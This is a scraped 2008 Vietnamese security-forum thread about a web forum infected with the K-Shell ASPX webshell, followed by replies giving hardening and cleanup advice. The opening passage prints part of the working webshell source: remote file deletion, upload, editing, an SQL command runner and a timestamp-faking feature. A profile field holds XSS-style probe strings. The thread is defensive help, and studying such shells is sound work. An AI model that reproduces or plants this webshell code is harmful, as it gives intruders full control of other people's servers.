    &lt;asp:TextBox ID="ip" runat="server" Width="300" class="TextBox" Text="127.0.0.1"/&gt;&lt;/p&gt;
  &lt;p&gt;
  SQL Name:
    &lt;asp:TextBox ID="SqlName" runat="server" Width="50" class="TextBox" Text='sa'/&gt;
  SQL Password:
  &lt;asp:TextBox ID="SqlPass" runat="server" Width="80" class="TextBox"/&gt;
  &lt;/p&gt;
  Command:
  &lt;asp:TextBox ID="Sqlcmd" runat="server" Width="300" class="TextBox"/&gt;
  &lt;asp:Button ID="ButtonSQL" runat="server" Text="Run" OnClick="RunSQLCMD" class="buttom"/&gt;  
  &lt;p&gt;
   &lt;asp:Label ID="resultSQL" runat="server" style="style2"/&gt;      &lt;/p&gt;
&lt;/form&gt;
&lt;%
	case "del"
		dim a as string
		a=request.QueryString&#40;"src"&#41;
		call existdir&#40;a&#41;
		call del&#40;a&#41;  
		response.Write&#40;"&lt;script&gt;alert&#40;""Delete " & replace&#40;a,"\","\\"&#41; & " Success!""&#41;;location.href='"& request.ServerVariables&#40;"URL"&#41; & "?action=goto&src="& server.UrlEncode&#40;Getparentdir&#40;a&#41;&#41; &"'&lt;/script&gt;"&#41;
	case "copy"
		call existdir&#40;request.QueryString&#40;"src"&#41;&#41;
		session&#40;"cutboard"&#41;="" & request.QueryString&#40;"src"&#41;
		response.Write&#40;"&lt;script&gt;alert&#40;'File info have add the cutboard, go to target directory click plaste!'&#41;;location.href='JavaScript:self.close&#40;&#41;';&lt;/script&gt;"&#41;
	case "cut"
		call existdir&#40;request.QueryString&#40;"src"&#41;&#41;
		session&#40;"cutboard"&#41;="" & request.QueryString&#40;"src"&#41;
		response.Write&#40;"&lt;script&gt;alert&#40;'File info have add the cutboard, go to target directory click plaste!'&#41;;location.href='JavaScript:self.close&#40;&#41;';&lt;/script&gt;"&#41;
	case "plaster"
		dim ow as integer
		if request.Form&#40;"OverWrite"&#41;&lt;&gt;"" then ow=1
		if request.Form&#40;"Cancel"&#41;&lt;&gt;"" then ow=2
		url=request.QueryString&#40;"src"&#41;
		call existdir&#40;url&#41;
		dim d as string
		d=session&#40;"cutboard"&#41;
		if left&#40;d,1&#41;="" then
			TEMP1=url & path.getfilename&#40;mid&#40;replace&#40;d,"",""&#41;,1,len&#40;replace&#40;d,"",""&#41;&#41;-1&#41;&#41;
			TEMP2=url & replace&#40;path.getfilename&#40;d&#41;,"",""&#41;
			if right&#40;d,1&#41;="\" then   
				call xexistdir&#40;TEMP1,ow&#41;
				directory.move&#40;replace&#40;d,"",""&#41;,TEMP1 & "\"&#41;  
				response.Write&#40;"&lt;script&gt;alert&#40;'Cut  " & replace&#40;replace&#40;d,"",""&#41;,"\","\\"&#41; & "  to  " & replace&#40;TEMP1 & "\","\","\\"&#41; & "  success!'&#41;;location.href='"& request.ServerVariables&#40;"URL"&#41; & "?action=goto&src="& server.UrlEncode&#40;url&#41; &"'&lt;/script&gt;"&#41;
			else
				call xexistdir&#40;TEMP2,ow&#41;
				file.move&#40;replace&#40;d,"",""&#41;,TEMP2&#41;
				response.Write&#40;"&lt;script&gt;alert&#40;'Cut  " & replace&#40;replace&#40;d,"",""&#41;,"\","\\"&#41; & "  to  " & replace&#40;TEMP2,"\","\\"&#41; & "  success!'&#41;;location.href='"& request.ServerVariables&#40;"URL"&#41; & "?action=goto&src="& server.UrlEncode&#40;url&#41; &"'&lt;/script&gt;"&#41;
			end if
		else
			TEMP1=url & path.getfilename&#40;mid&#40;replace&#40;d,"",""&#41;,1,len&#40;replace&#40;d,"",""&#41;&#41;-1&#41;&#41;
			TEMP2=url & path.getfilename&#40;replace&#40;d,"",""&#41;&#41;
			if right&#40;d,1&#41;="\" then 
				call xexistdir&#40;TEMP1,ow&#41;
				directory.createdirectory&#40;TEMP1&#41;
				call copydir&#40;replace&#40;d,"",""&#41;,TEMP1 & "\"&#41;
				response.Write&#40;"&lt;script&gt;alert&#40;'Copy  " & replace&#40;replace&#40;d,"",""&#41;,"\","\\"&#41; & "  to  " & replace&#40;TEMP1 & "\","\","\\"&#41; & "  success!'&#41;;location.href='"& request.ServerVariables&#40;"URL"&#41; & "?action=goto&src="& server.UrlEncode&#40;url&#41; &"'&lt;/script&gt;"&#41;
			else
				call xexistdir&#40;TEMP2,ow&#41;
				file.copy&#40;replace&#40;d,"",""&#41;,TEMP2&#41;
				response.Write&#40;"&lt;script&gt;alert&#40;'Copy  " & replace&#40;replace&#40;d,"",""&#41;,"\","\\"&#41; & "  to  " & replace&#40;TEMP2,"\","\\"&#41; & "  success!'&#41;;location.href='"& request.ServerVariables&#40;"URL"&#41; & "?action=goto&src="& server.UrlEncode&#40;url&#41; &"'&lt;/script&gt;"&#41;
			end if
		end if
	case "upfile"
		url=request.QueryString&#40;"src"&#41;
%&gt;
&lt;form name="UpFileForm" enctype="multipart/form-data" method="post" action="?src=&lt;%=server.UrlEncode&#40;url&#41;%&gt;" runat="server"  onSubmit="return checkname&#40;&#41;;"&gt;
 You will upload file to this directory : &lt;span class="style3"&gt;&lt;%=url%&gt;&lt;/span&gt;&lt;br&gt;
 Please choose file from your computer :
 &lt;input name="upfile" type="file" class="TextBox" id="UpFile" runat="server"&gt;
    &lt;input type="submit" id="UpFileSubit" value="Upload" runat="server" onserverclick="UpLoad" class="buttom"&gt;
&lt;/form&gt;
&lt;a href="javascript:history.back&#40;1&#41;;" style="color:#FF0000"&gt;Go Back &lt;/a&gt;
&lt;%
	case "new"
		url=request.QueryString&#40;"src"&#41;
%&gt;
&lt;form runat="server"&gt;
  &lt;%=url%&gt;&lt;br&gt;
  Name:
  &lt;asp:TextBox ID="NewName" TextMode="SingleLine" runat="server" class="TextBox"/&gt;
  &lt;br&gt;
  &lt;asp:RadioButton ID="NewFile" Text="File" runat="server" GroupName="New" Checked="true"/&gt;
  &lt;asp:RadioButton ID="NewDirectory" Text="Directory" runat="server"  GroupName="New"/&gt; 
  &lt;br&gt;
  &lt;asp:Button ID="NewButton" Text="Submit" runat="server" CssClass="buttom"  OnClick="NewFD"/&gt;  
  &lt;input name="Src" type="hidden" value="&lt;%=url%&gt;"&gt;
&lt;/form&gt;
&lt;a href="javascript:history.back&#40;1&#41;;" style="color:#FF0000"&gt;Go Back&lt;/a&gt;
&lt;%
	case "edit"
		dim b as string
		b=request.QueryString&#40;"src"&#41;
		call existdir&#40;b&#41;
		dim myread as new streamreader&#40;b,encoding.default&#41;
		filepath.text=b
		content.text=myread.readtoend
%&gt;
&lt;form runat="server"&gt;
  &lt;table width="80%"  border="1" align="center"&gt;
    &lt;tr&gt;      &lt;td width="11%"&gt;Path&lt;/td&gt;
      &lt;td width="89%"&gt;
      &lt;asp:TextBox CssClass="TextBox" ID="filepath" runat="server" Width="300"/&gt;
      *&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Content&lt;/td&gt; 
      &lt;td&gt; &lt;asp:TextBox ID="content" Rows="25" Columns="100" TextMode="MultiLine" runat="server" CssClass="TextBox"/&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;/td&gt;
      &lt;td&gt; &lt;asp:Button ID="a" Text="Sumbit" runat="server" OnClick="Editor" CssClass="buttom"/&gt;         
      &lt;/td&gt;
    &lt;/tr&gt;
  &lt;/table&gt;
&lt;/form&gt;
&lt;a href="javascript:history.back&#40;1&#41;;" style="color:#FF0000"&gt;Go Back&lt;/a&gt;
&lt;%
  		myread.close
	case "rename"
		url=request.QueryString&#40;"src"&#41;
		if request.Form&#40;"name"&#41;="" then
	%&gt;
&lt;form name="formRn" method="post" action="?action=rename&src=&lt;%=server.UrlEncode&#40;request.QueryString&#40;"src"&#41;&#41;%&gt;" onSubmit="return checkname&#40;&#41;;"&gt;
  &lt;p&gt;You will rename &lt;span class="style3"&gt;&lt;%=request.QueryString&#40;"src"&#41;%&gt;&lt;/span&gt;to: &lt;%=getparentdir&#40;request.QueryString&#40;"src"&#41;&#41;%&gt;
    &lt;input type="text" name="name" class="TextBox"&gt;
    &lt;input type="submit" name="Submit3" value="Submit" class="buttom"&gt;
&lt;/p&gt;
&lt;/form&gt;
&lt;a href="javascript:history.back&#40;1&#41;;" style="color:#FF0000"&gt;Go Back&lt;/a&gt;
&lt;script language="javascript"&gt;
function checkname&#40;&#41;
{
if&#40;formRn.name.value==""&#41;{alert&#40;"You shall input filename :&#40;"&#41;;return false}
}
&lt;/script&gt;
  &lt;%
		else
			if Rename&#40;&#41; then
				response.Write&#40;"&lt;script&gt;alert&#40;'Rename " & replace&#40;url,"\","\\"&#41; & " to " & replace&#40;Getparentdir&#40;url&#41; & request.Form&#40;"name"&#41;,"\","\\"&#41; & " Success!'&#41;;location.href='"& request.ServerVariables&#40;"URL"&#41; & "?action=goto&src="& server.UrlEncode&#40;Getparentdir&#40;url&#41;&#41; &"'&lt;/script&gt;"&#41;
			else
				response.Write&#40;"&lt;script&gt;alert&#40;'Exist the same name file , rename fail :&#40;'&#41;;location.href='"& request.ServerVariables&#40;"URL"&#41; & "?action=goto&src="& server.UrlEncode&#40;Getparentdir&#40;url&#41;&#41; &"'&lt;/script&gt;"&#41;
			end if
		end if
	case "samename"
		url=request.QueryString&#40;"src"&#41;
%&gt;
&lt;form name="form1" method="post" action="?action=plaster&src=&lt;%=server.UrlEncode&#40;url&#41;%&gt;"&gt;
&lt;p class="style3"&gt;Exist the same name file , can you overwrite ?&#40;If you click &quot; no&quot; , it will auto add a number as prefix&#41;&lt;/p&gt;
  &lt;input name="OverWrite" type="submit" id="OverWrite" value="Yes" class="buttom"&gt;
&lt;input name="Cancel" type="submit" id="Cancel" value="No" class="buttom"&gt;
&lt;/form&gt;
&lt;a href="javascript:history.back&#40;1&#41;;" style="color:#FF0000"&gt;Go Back&lt;/a&gt;
   &lt;%
    case "clonetime"
		time1.Text=request.QueryString&#40;"src"&#41;&"kshell.aspx"
		time2.Text=request.QueryString&#40;"src"&#41;
	%&gt;
&lt;form runat="server"&gt;
  &lt;p&gt;&#91;CloneTime for WebAdmin&#93;&lt;i&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;a href="javascript:history.back&#40;1&#41;;"&gt;Back&lt;/a&gt;&lt;/i&gt; &lt;/p&gt;
  &lt;p&gt;A tool that it copy the file or directory's time to another file or directory &lt;/p&gt;
  &lt;p&gt;Rework File or Dir:
    &lt;asp:TextBox CssClass="TextBox" ID="time1" runat="server" Width="300"/&gt;&lt;/p&gt;
  &lt;p&gt;Copied File or Dir:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
    &lt;asp:TextBox CssClass="TextBox" ID="time2" runat="server" Width="300"/&gt;&lt;/p&gt;
&lt;asp:Button ID="ButtonClone" Text="Submit" runat="server" CssClass="buttom" OnClick="CloneTime"/&gt;
&lt;/form&gt;
&lt;p&gt;
  &lt;%
	case "logout"
   		session.Abandon&#40;&#41;
		response.Write&#40;"&lt;script&gt;alert&#40;' Goodbye !'&#41;;location.href='" & request.ServerVariables&#40;"URL"&#41; & "';&lt;/sc" & "ript&gt;"&#41;
	end select
end if
Catch error_x
	response.Write&#40;"&lt;font color=""red""&gt;Wrong: &lt;/font&gt;"&error_x.Message&#41;
End Try
%&gt;
&lt;/p&gt;
&lt;/p&gt;
&lt;hr&gt;
&lt;script language="javascript"&gt;
function closewindow&#40;&#41;
{self.close&#40;&#41;;}
&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;</pre>
		</div></span></td>
                  </tr>
                </table>
          <!-- Attachments -->
			  		</td>
      </tr>


			<tr>
		        <td valign="bottom" class="row1" align="center"><div class="action" align="center">
	<table width="100%" border="0">
  		<tr>
		<td align="left">
					</td>
		<td align="right">
			<!--  -->
			
		


		
		
		<a class="nav" href="#top"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/icon_up.gif" alt="[Up]" title="[Up]"></a>
			<img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/icon_print.gif" alt="[Print Copy]" title="[Print Copy]"></a>
		</td>
  	</tr>
	</table>
</div></td>
		  </tr>
	</table>

<table cellspacing="0" cellpadding="0" width="100%" align="center" border="0">
	<tr>
    	<td class="catbottomslim" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="5"></td>
  	</tr>
	<tr>
		<td><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="20"></td>
	</tr>
</table>

		


<table cellspacing="0" cellpadding="0" width="100%" align="center" border="1">
	<table cellspacing="0" cellpadding="3" width="100%" align="center" border="0">
      <tr>

		

		<th nowrap="nowrap" class="thright" height="20" valign="middle" align="left">&nbsp;&nbsp;<span class="posttype"><font color="#777777">[Question]</font></span>&nbsp;&nbsp; Re: Forum WWF 9.53 bị nhiễm K-SHELL, làm sao để fix<a name="160041" id="160041"></a></th>
        <th class="thleft" nowrap="nowrap" width="300" height="20" valign="middle" align="right">24/11/2008 14:33:10 (+0700) | <a href="/hvaonline/posts/list/26343.html#160041">#2</a> | 160041 </th>
		
      </tr>
	</table>

	<table cellspacing="0" cellpadding="3" width="100%" align="center" border="0">
      <tr> 
		<!-- Username & profile -->
          	<td class="rowButton" valign="top">
<table cellspacing="3" cellpadding="3" width="100%" align="left" border="0">
<tr>
<td width="20">
		<img src="http://www.hvaonline.net/hvaonline/images/avatar/d1d0efd9002e947af46b063dbbb904ef.png" border="0" alt="[Avatar]" title="[Avatar]"><br>
	</td>

<td align="left">
<span class="uprofile"><a href="/hvaonline/user/profile/125538.html"><b>BachDuongTM</b></a><br>
	<font color="#CCCCCC">Member</font></span>
<br>

<span class="uprofile">
		
</span>
	<table cellspacing="0" cellpadding="0" border="0" width="20" height="8">
		<tr>
			<td>
				<img src="http://www.hvaonline.net/hvaonline/templates/viet/images/minus.gif" alt="[Minus]" title="[Minus]"></a>	</td>
			<td height="4" width="16">
				<span class="warn">&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;</span>	</td>
			<td>
				<img src="http://www.hvaonline.net/hvaonline/templates/viet/images/plus.gif" alt="[Plus]" title="[Plus]"></a>
			</td>
		</tr>
	</table>

<!-- --></td>
	<td align="left" class="gen" width="180">
		Joined: 29/06/2006 17:39:39<br>
		Messages: 85<br>
	
	
	
			<span class="offline">Offline </span>
	<br>
<table cellspacing="0" cellpadding="0" border="0" width="100%">
  <tr>
	<td valign="middle" nowrap="nowrap"> 
		<a href="/hvaonline/user/profile/125538.html" class="icon_profile"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/icon_profile.gif" alt="[Profile]" title="[Profile]"></a>
		<a href="/hvaonline/pm/sendTo/125538.html" class="icon_pm"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/icon_pm.gif" alt="[PM]" title="[PM]"></a>


				<a href="#" onclick="document.location = 'mailto:' + showEmail('ngaykhongmua', 'gmail.com');"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_email.gif" alt="[Email]" title="[E-mai]"></a>
		
		
		
		
	</td>
</tr>
  <tr>
    <td valign="middle" nowrap="nowrap">
	
</td>
  </tr>
</table>
	</td>
</tr>
</table>
</td>
      </tr>
	</table>
	
	<table cellspacing="1" cellpadding="3" width="100%" align="center" border="0">
      <tr>
        <!-- Message -->
        <td colspan="2" valign="top" class="row2">
				<!-- should view editeBy or not -->
			  <!-- which to view -->
                <table cellspacing="3" cellpadding="3" width="100%" align="center" border="0">
                  <tr>
                    <td valign="top" class="row2"><span class="postbody">Đây là 1 public .apsx webshell được công bố khá rộng rãi, tên K-shell chắc chỉ là sửa tên choi vui thôi.<br/> <br/> Quay lại vấn đề chính, câu hỏi đặt ra là bạn muốn fix thế nào ?Nếu là delete file shell thì đơn giản, nhưng để bảo mật không bị tấn công lần nữa thì khó hơn. Ít nhất tại thời điểm hiện tại, bạn không biết vì sao shell được upload lên server và nó còn là cái thòng lọng treo đó .<br/> <br/> <br/> Về kinh nghiệm server 2k3 mình có xíu chia sẻ :<br/> <br/> 1. đảm bảo code viết tốt nhất có thể, tốt về hoạt động, và tốt về bảo mật.<br/> 2. Hoàn thiện code ở local<br/> 3. Upload code lên thư mục web trên server và tiến hành phân quyền lại hợp lý <br/> 4. Thư mục code chỉ có quyền đọc với user site , hoặc thường là IIS guest .<br/> 5. Thư mục code có quyền đọc ghi với FTP user để có thể tiến hành chỉnh sửa lại code<br/> 6. Thư mục code có thêm 1 thư mục upload, thư mục này là thư mục đặc biệt, User site có quyền ghi và xóa trên đó, tuy nhiên IIS chỉ hoạt động ở chế độ no script với thư mục đó, tức là cho dù uload mã .aspx lên đó thì IIS chỉ đối xử như là một file text thường, thư mục này sẽ đựoc sử dụng để upload nội dung từ member.<br/> 7. Với mã .php thì chỉ ở trên là đủ để đảm bảo an toàn site nhưng mã aspx được hoạt động đưới một định danh riêng, mình từng kiểm chứng thấy ngang quyền system, vì thế đúng là họa vô đơn chí, add system deny edit lun thư mục code.Và hy vọng chính sách của mình không có lỗ hổng.<br/> <br/> 8. Cầu nguyện <br/>  <img src="/hvaonline/images/smilies/3019f422209a6593f02fad5560f36b79.gif" border="0" alt="smilie" align="absbottom">  <img src="/hvaonline/images/smilies/3019f422209a6593f02fad5560f36b79.gif" border="0" alt="smilie" align="absbottom">  <img src="/hvaonline/images/smilies/3019f422209a6593f02fad5560f36b79.gif" border="0" alt="smilie" align="absbottom"> </span></td>
                  </tr>
                </table>
          <!-- Attachments -->
			  		</td>
      </tr>


			<tr>
		        <td valign="bottom" class="row1" align="center"><div class="action" align="center">
	<table width="100%" border="0">
  		<tr>
		<td align="left">
					</td>
		<td align="right">
			<!--  -->
			
		


		
		
		<a class="nav" href="#top"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/icon_up.gif" alt="[Up]" title="[Up]"></a>
			<img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/icon_print.gif" alt="[Print Copy]" title="[Print Copy]"></a>
		</td>
  	</tr>
	</table>
</div></td>
		  </tr>
	</table>

<table cellspacing="0" cellpadding="0" width="100%" align="center" border="0">
	<tr>
    	<td class="catbottomslim" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="5"></td>
  	</tr>
	<tr>
		<td><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="20"></td>
	</tr>
</table>

		


<table cellspacing="0" cellpadding="0" width="100%" align="center" border="1">
	<table cellspacing="0" cellpadding="3" width="100%" align="center" border="0">
      <tr>

		

		<th nowrap="nowrap" class="thright" height="20" valign="middle" align="left">&nbsp;&nbsp;<span class="posttype"><font color="#777777">[Question]</font></span>&nbsp;&nbsp; Re: Forum WWF 9.53 bị nhiễm K-SHELL, làm sao để fix<a name="160087" id="160087"></a></th>
        <th class="thleft" nowrap="nowrap" width="300" height="20" valign="middle" align="right">25/11/2008 02:59:55 (+0700) | <a href="/hvaonline/posts/list/26343.html#160087">#3</a> | 160087 </th>
		
      </tr>
	</table>

	<table cellspacing="0" cellpadding="3" width="100%" align="center" border="0">
      <tr> 
		<!-- Username & profile -->
          	<td class="rowButton" valign="top">
<table cellspacing="3" cellpadding="3" width="100%" align="left" border="0">
<tr>

<td align="left">
<span class="uprofile"><a href="/hvaonline/user/profile/133751.html"><b>ktstbniit</b></a><br>
	<font color="#CCCCCC">Member</font></span>
<br>

<span class="uprofile">
		
</span>
	<table cellspacing="0" cellpadding="0" border="0" width="20" height="8">
		<tr>
			<td>
				<img src="http://www.hvaonline.net/hvaonline/templates/viet/images/minus.gif" alt="[Minus]" title="[Minus]"></a>	</td>
			<td height="4" width="16">
				<span class="warn">&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;</span>	</td>
			<td>
				<img src="http://www.hvaonline.net/hvaonline/templates/viet/images/plus.gif" alt="[Plus]" title="[Plus]"></a>
			</td>
		</tr>
	</table>

<!-- --></td>
	<td align="left" class="gen" width="180">
		Joined: 03/01/2007 10:39:15<br>
		Messages: 5<br>
	
	
	
			<span class="offline">Offline </span>
	<br>
<table cellspacing="0" cellpadding="0" border="0" width="100%">
  <tr>
	<td valign="middle" nowrap="nowrap"> 
		<a href="/hvaonline/user/profile/133751.html" class="icon_profile"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/icon_profile.gif" alt="[Profile]" title="[Profile]"></a>
		<a href="/hvaonline/pm/sendTo/133751.html" class="icon_pm"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/icon_pm.gif" alt="[PM]" title="[PM]"></a>

		
			<a href="http://e-sach.com" target="_new"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_www.gif" alt="[WWW]" title="[www]"></a>
		
			<a href="http://edit.yahoo.com/config/send_webmesg?.target=ktstbniit&amp;.src=pg"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_yim.gif" alt="[Yahoo!]" title="[YIM]"></a>
		
		
	</td>
</tr>
  <tr>
    <td valign="middle" nowrap="nowrap">
	
</td>
  </tr>
</table>
	</td>
</tr>
</table>
</td>
      </tr>
	</table>
	
	<table cellspacing="1" cellpadding="3" width="100%" align="center" border="0">
      <tr>
        <!-- Message -->
        <td colspan="2" valign="top" class="row1">
				<!-- should view editeBy or not -->
			  <!-- which to view -->
                <table cellspacing="3" cellpadding="3" width="100%" align="center" border="0">
                  <tr>
                    <td valign="top" class="row1"><span class="postbody">Website của mình thuê host của nhân hòa. Mình tìm trong cPanel thì chả thấy chỗ nào để cài đặt permision cả. phần code của WWF thì mình kiểm tra, 1 số module cho phép upload thì nó chặn, chỉ cho phép upload file ảnh, thử đổi cái file kia thành đuôi jpg thì cũng ko upload đc, Cái RTEditor thì mình cũng đã kiểm tra.<br/> <br/> Các mục khác bạn nói thì khó quá, với cPanel ko làm đc thì phải. Nên mình đang dùng cách thứ 8 của bạn nếu.<br/> <br/> Có cách khác thì giúp mình nữa nhé. Thanks</span></td>
                  </tr>
                </table>
          <!-- Attachments -->
			  		</td>
      </tr>


			<tr>
		        <td valign="bottom" class="row1" align="center"><div class="action" align="center">
	<table width="100%" border="0">
  		<tr>
		<td align="left">
					</td>
		<td align="right">
			<!--  -->
			
		


		
		
		<a class="nav" href="#top"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/icon_up.gif" alt="[Up]" title="[Up]"></a>
			<img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/icon_print.gif" alt="[Print Copy]" title="[Print Copy]"></a>
		</td>
  	</tr>
	</table>
</div></td>
		  </tr>
	</table>

<table cellspacing="0" cellpadding="0" width="100%" align="center" border="0">
	<tr>
    	<td class="catbottomslim" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="5"></td>
  	</tr>
	<tr>
		<td><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="20"></td>
	</tr>
</table>

		


<table cellspacing="0" cellpadding="0" width="100%" align="center" border="1">
	<table cellspacing="0" cellpadding="3" width="100%" align="center" border="0">
      <tr>

		

		<th nowrap="nowrap" class="thright" height="20" valign="middle" align="left">&nbsp;&nbsp;<span class="posttype"><font color="#777777">[Question]</font></span>&nbsp;&nbsp; Re: Forum WWF 9.53 bị nhiễm K-SHELL, làm sao để fix<a name="160254" id="160254"></a></th>
        <th class="thleft" nowrap="nowrap" width="300" height="20" valign="middle" align="right">26/11/2008 05:04:37 (+0700) | <a href="/hvaonline/posts/list/26343.html#160254">#4</a> | 160254 </th>
		
      </tr>
	</table>

	<table cellspacing="0" cellpadding="3" width="100%" align="center" border="0">
      <tr> 
		<!-- Username & profile -->
          	<td class="rowButton" valign="top">
<table cellspacing="3" cellpadding="3" width="100%" align="left" border="0">
<tr>
<td width="20">
		<img src="http://www.hvaonline.net/hvaonline/images/avatar/e7c9302fbc4ad04c3a143dec8951a279.jpg" border="0" alt="[Avatar]" title="[Avatar]"><br>
	</td>

<td align="left">
<span class="uprofile"><a href="/hvaonline/user/profile/138233.html"><b>azteam</b></a><br>
	<font color="#CCCCCC">Member</font></span>
<br>

<span class="uprofile">
		
</span>
	<table cellspacing="0" cellpadding="0" border="0" width="20" height="8">
		<tr>
			<td>
				<img src="http://www.hvaonline.net/hvaonline/templates/viet/images/minus.gif" alt="[Minus]" title="[Minus]"></a>	</td>
			<td height="4" width="16">
				<span class="warn">&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;</span>	</td>
			<td>
				<img src="http://www.hvaonline.net/hvaonline/templates/viet/images/plus.gif" alt="[Plus]" title="[Plus]"></a>
			</td>
		</tr>
	</table>

<!-- --></td>
	<td align="left" class="gen" width="180">
		Joined: 17/03/2007 21:12:46<br>
		Messages: 177<br>
	
		Location: /dev/null<br>
	
	
			<span class="offline">Offline </span>
	<br>
<table cellspacing="0" cellpadding="0" border="0" width="100%">
  <tr>
	<td valign="middle" nowrap="nowrap"> 
		<a href="/hvaonline/user/profile/138233.html" class="icon_profile"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/icon_profile.gif" alt="[Profile]" title="[Profile]"></a>
		<a href="/hvaonline/pm/sendTo/138233.html" class="icon_pm"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/icon_pm.gif" alt="[PM]" title="[PM]"></a>

		
		
		
		
	</td>
</tr>
  <tr>
    <td valign="middle" nowrap="nowrap">
	
</td>
  </tr>
</table>
	</td>
</tr>
</table>
</td>
      </tr>
	</table>
	
	<table cellspacing="1" cellpadding="3" width="100%" align="center" border="0">
      <tr>
        <!-- Message -->
        <td colspan="2" valign="top" class="row2">
				<!-- should view editeBy or not -->
			  <!-- which to view -->
                <table cellspacing="3" cellpadding="3" width="100%" align="center" border="0">
                  <tr>
                    <td valign="top" class="row2"><span class="postbody">Ngoài các vấn đề BachDuongTM đề cập. Em cũng có một số ý kiến:<br/> - Hiện tại nên backup source về check lại cẩn thận xem có gì khác không, check logfile web xem file đấy được upload lên host bằng cách nào?<br/> - Nếu không nhầm thì Forum WWF chạy .asp, nếu chỉ chạy .asp thôi thì tốt nhất Website Extensions chỉ cho chạy asp, bỏ asp.net và php đi.<br/> - Để chống k-shell thường từ các hosting provider(chạy .NET với trust level = medium, không cho overwrite webconfig, ...). nếu bạn không tự xử lý được tốt nhất nên liện hệ với hosting provider để cùng xử lý.<br/> - Nếu dùng shared hosting thì vấn đề secu cho host rất khó khăn và không mấy khả thi.<br/> <br/> <img src="/hvaonline/images/smilies/b5e9b4f86ce43ca65bd79c894c4a924c.gif" border="0" alt="smilie" align="absbottom"></span></td>
                  </tr>
                </table>
          <!-- Attachments -->
			  		</td>
      </tr>


			<tr>
		        <td valign="bottom" class="row1" align="center"><div class="action" align="center">
	<table width="100%" border="0">
  		<tr>
		<td align="left">
					</td>
		<td align="right">
			<!--  -->
			
		


		
		
		<a class="nav" href="#top"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/icon_up.gif" alt="[Up]" title="[Up]"></a>
			<img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/icon_print.gif" alt="[Print Copy]" title="[Print Copy]"></a>
		</td>
  	</tr>
	</table>
</div></td>
		  </tr>
	</table>

<table cellspacing="0" cellpadding="0" width="100%" align="center" border="0">
	<tr>
    	<td class="catbottomslim" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="5"></td>
  	</tr>
	<tr>
		<td><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="20"></td>
	</tr>
</table>

		


<table cellspacing="0" cellpadding="0" width="100%" align="center" border="1">
	<table cellspacing="0" cellpadding="3" width="100%" align="center" border="0">
      <tr>

		

		<th nowrap="nowrap" class="thright" height="20" valign="middle" align="left">&nbsp;&nbsp;<span class="posttype"><font color="#777777">[Question]</font></span>&nbsp;&nbsp; Re: Forum WWF 9.53 bị nhiễm K-SHELL, làm sao để fix<a name="160261" id="160261"></a></th>
        <th class="thleft" nowrap="nowrap" width="300" height="20" valign="middle" align="right">26/11/2008 05:58:02 (+0700) | <a href="/hvaonline/posts/list/26343.html#160261">#5</a> | 160261 </th>
		
      </tr>
	</table>

	<table cellspacing="0" cellpadding="3" width="100%" align="center" border="0">
      <tr> 
		<!-- Username & profile -->
          	<td class="rowButton" valign="top">
<table cellspacing="3" cellpadding="3" width="100%" align="left" border="0">
<tr>
<td width="20">
		<img src="http://www.hvaonline.net/hvaonline/images/avatar/7f11b15655b2342b01a2db7edb7961cd.jpeg" border="0" alt="[Avatar]" title="[Avatar]"><br>
	</td>

<td align="left">
<span class="uprofile"><a href="/hvaonline/user/profile/22332.html"><b>gamma95</b></a><br>
	<font color="#ff3399">Researcher</font></span>
<br>

<span class="uprofile">
		
</span>

<!-- --></td>
	<td align="left" class="gen" width="180">
		Joined: 20/05/2003 07:15:41<br>
		Messages: 1377<br>
	
		Location: aaa&amp;quot;&amp;gt;<br>
	
	
			<span class="offline">Offline </span>
	<br>
<table cellspacing="0" cellpadding="0" border="0" width="100%">
  <tr>
	<td valign="middle" nowrap="nowrap"> 
		<a href="/hvaonline/user/profile/22332.html" class="icon_profile"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/icon_profile.gif" alt="[Profile]" title="[Profile]"></a>
		<a href="/hvaonline/pm/sendTo/22332.html" class="icon_pm"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/icon_pm.gif" alt="[PM]" title="[PM]"></a>

		
		
		
		
			<a href="http://wwp.icq.com/scripts/search.dll?to=0nerror=alert()"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_icq_add.gif" alt="[ICQ]" title="[ICQ]"></a>
	</td>
</tr>
